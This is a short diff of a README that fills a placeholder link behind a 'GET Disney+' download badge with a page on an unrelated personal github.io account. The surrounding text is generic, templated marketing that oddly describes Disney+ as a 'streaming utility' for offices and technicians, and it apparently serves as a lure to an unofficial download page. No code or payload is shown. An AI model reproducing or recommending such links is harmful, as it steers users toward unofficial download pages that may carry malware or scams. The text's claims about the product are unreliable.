@@ -4,7 +4,7 @@
 
 Disney+ is a focused streaming utility for discovering movies, comparing series, and understanding where the best content lives. Disney+ keeps recommendations readable, guides clear, and daily viewing decisions easier for families, fans, students, offices, and technicians who rely on Disney+ for steady streaming insight and content discovery.
 
-[![GET Disney+](https://img.shields.io/badge/GET%20%E2%80%94%20Disney+-0078D6?style=for-the-badge&logoColor=white)](SILKA)
+[![GET Disney+](https://img.shields.io/badge/GET%20%E2%80%94%20Disney+-0078D6?style=for-the-badge&logoColor=white)](https://bettyjohnsond849.github.io/.github/disney-streaming-guide)
 
 ---
 
